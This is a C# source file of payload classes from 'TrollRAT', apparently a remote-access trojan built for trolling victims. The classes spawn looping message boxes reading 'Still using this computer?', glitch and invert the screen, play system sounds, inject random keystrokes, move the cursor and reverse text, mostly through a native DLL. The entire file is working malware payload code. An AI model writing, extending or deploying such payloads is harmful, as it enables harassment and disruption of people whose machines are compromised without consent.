using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;

using TrollRAT.Payloads;
using TrollRATPayloads.Actions;

namespace TrollRATPayloads.Payloads
{
    public class PayloadMessageBox : LoopingPayload
    {
        [DllImport("TrollRATNative.dll", CharSet = CharSet.Auto)]
        public static extern void payloadMessageBox(string text, string label, int style, int mode);

        protected PayloadSettingSelect mode = new PayloadSettingSelect(0, "Mode",
            new string[] { "Fixed Text", "Random Error Messages" });

        protected PayloadSettingString text = new PayloadSettingString("Still using this computer?", "Message Box Text");
        protected PayloadSettingString label = new PayloadSettingString("lol", "Window Title");

        protected PayloadSettingSelect icon = new PayloadSettingSelect(3, "Message Box Icon",
            new string[] {"None", "Error", "Question", "Warning", "Information", "Random"});

        public PayloadMessageBox()
        {
            name = "Message Boxes";

            settings.Add(mode);

            settings.Add(text);
            settings.Add(label);

            settings.Add(icon);

            actions.Add(new PayloadActionClearWindows(this));
        }

        protected override void execute()
        {
            new Thread(new ThreadStart(messageBoxThread)).Start();
        }

        private void messageBoxThread()
        {
            int i = icon.Value;
            if (i == 5)
                i = new Random().Next(1, 5);

            payloadMessageBox(text.Value, label.Value, 0x1000 | (i << 4), mode.Value);
        }
    }

    public class PayloadGlitch : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadGlitch(int maxSize, int power);

        protected PayloadSettingNumber maxSize = new PayloadSettingNumber(500, "Maximum Rectangle Size", 20, 1000, 1);
        protected PayloadSettingNumber power = new PayloadSettingNumber(2, "Glitch Power", 1, 40, 1);

        public PayloadGlitch() : base(20)
        {
            actions.Add(new PayloadActionClearScreen(this));

            settings.Add(maxSize);
            settings.Add(power);

            name = "Screen Glitches";
        }

        protected override void execute()
        {
            payloadGlitch((int)maxSize.Value, (int)power.Value);
        }
    }

    public class PayloadSound : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadSound(int sound);

        protected PayloadSettingSelect sound = new PayloadSettingSelect(6, "Sound Type",
            new string[] { "Error", "Warning", "Information", "Question", "Startup", "Shutdown", "Random" });

        public PayloadSound() : base(30)
        {
            settings.Add(sound);

            name = "Play System Sounds";
        }

        protected override void execute()
        {
            int i = sound.Value;
            if (i == 6)
                i = new Random().Next(0, 4);

            payloadSound(i);
        }
    }

    public class PayloadKeyboard : LoopingPayload
    {
        public PayloadKeyboard() : base(20) { name = "Random Keyboard Input"; }

        protected override void execute()
        {
            SendKeys.SendWait(((Char)new Random().Next('a', 'z'+1)).ToString());
        }
    }

    public class PayloadTunnel : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadTunnel(int scale);

        protected PayloadSettingNumber scale = new PayloadSettingNumber(50, "Scale factor per iteration", 1, 400, 1);

        public PayloadTunnel() : base(20)
        {
            actions.Add(new PayloadActionClearScreen(this));
            settings.Add(scale);

            name = "Tunnel Effect";
        }

        protected override void execute()
        {
            payloadTunnel((int)scale.Value);
        }
    }

    public class PayloadReverseText : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadReverseText();

        public PayloadReverseText() { name = "Reverse Text"; }

        protected override void execute()
        {
            payloadReverseText();
        }
    }

    public class PayloadDrawErrors : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadDrawErrors(int count, int chance);

        protected PayloadSettingNumber errorCount = new PayloadSettingNumber(2, "Error Count", 1, 40, 1);
        protected PayloadSettingNumber errorChance = new PayloadSettingNumber(20, "Error Chance (in %)", 0, 100, 1);

        public PayloadDrawErrors() : base(2)
        {
            actions.Add(new PayloadActionClearScreen(this));

            settings.Add(errorCount);
            settings.Add(errorChance);

            name = "Draw Errors";
        }

        protected override void execute()
        {
            payloadDrawErrors((int)errorCount.Value, (int)errorChance.Value);
        }
    }

    public class PayloadInvertScreen : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadInvertScreen();

        public PayloadInvertScreen()
        {
            actions.Add(new PayloadActionClearScreen(this));
            name = "Invert Screen";
        }

        protected override void execute()
        {
            payloadInvertScreen();
        }
    }

    public class PayloadCursor : LoopingPayload
    {
        [DllImport("TrollRATNative.dll")]
        public static extern void payloadCursor(int power);

        private PayloadSettingNumber power = new PayloadSettingNumber(4, "Movement Factor", 2, 100, 1);

        public PayloadCursor() : base(2)
        {
            name = "Move Cursor";
            settings.Add(power);
        }

        protected override void execute()
        {
            payloadCursor((int)power.Value);
        }
    }
}
